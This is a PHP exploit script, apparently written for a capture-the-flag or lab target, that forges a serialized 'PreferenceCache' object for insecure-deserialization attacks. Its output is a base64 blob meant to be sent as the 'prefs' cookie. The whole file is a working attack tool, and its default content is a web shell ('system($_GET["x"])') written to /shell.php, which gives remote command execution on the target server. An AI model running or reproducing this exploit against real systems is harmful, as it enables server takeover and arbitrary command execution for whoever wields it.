<?php
// w19 blob-forge :: payload generator.
//
//   php payload.php                          # drop a shell at /shell.php
//   php payload.php -p /pwn.php -f shell.txt # custom shell path/body
//
// Prints the base64 blob to use as the `prefs` cookie. Stdlib only.
// Never put a literal PHP close tag in this file outside of code -- it ends the
// script. That is why the default content below is built from a constant.

$opts = getopt('p:c:f:', ['path:', 'content:', 'content-file:']);
$path = $opts['p'] ?? $opts['path'] ?? '/shell.php';

// Prefer --content-file: shell quoting of PHP tags is a footgun, and the caller
// should not have to escape the open/close tags a second time.
if (isset($opts['f']) || isset($opts['content-file'])) {
    $file = $opts['f'] ?? $opts['content-file'];
    $content = file_get_contents($file);
    if ($content === false) { fwrite(STDERR, "cannot read $file\n"); exit(1); }
} else {
    $content = $opts['c'] ?? $opts['content']
        ?? '<' . '?php system($_GET["x"]); ' . '?' . '>';
}

// The real class lives at app/classes.php; we rebuild it here so this script is
// standalone. Field order matches the class declaration.
$o = new stdClass();
$o->path    = $path;
$o->content = $content;
$o->ttl     = 3600;

// Hand-build the serialized form: stdClass emits `O:8:"stdClass":3:{...}`, but
// the server's class is PreferenceCache, so we need that exact name on the wire.
$body = sprintf(
    'O:%d:"PreferenceCache":3:{s:4:"path";s:%d:"%s";s:7:"content";s:%d:"%s";s:3:"ttl";i:%d;}',
    strlen('PreferenceCache'),
    strlen($o->path),    $o->path,
    strlen($o->content), $o->content,
    $o->ttl
);

echo base64_encode($body), "\n";
